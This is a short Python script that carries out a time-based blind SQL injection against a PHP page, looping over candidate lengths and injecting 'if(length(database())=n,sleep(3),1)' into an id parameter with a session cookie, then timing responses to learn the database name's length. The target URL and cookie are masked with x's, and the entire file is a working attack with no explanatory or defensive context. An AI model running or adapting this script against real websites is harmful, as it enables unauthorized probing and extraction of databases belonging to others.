import time

import requests

for len in range(1,50):
    header={"Cookie":"PHPSESSID=xxxxxxxxxxxxxxx"}
    url=f"http://xxxxxxxxxxx/xxxx.php?id=1 and if(length(database())={len},sleep(3),1)"
    start = time.time()
    resp = requests.get(url=url,headers=header)
    end = time.time()
    resptime = end-start
    if int(resptime)>=3:
        print(len)
        break

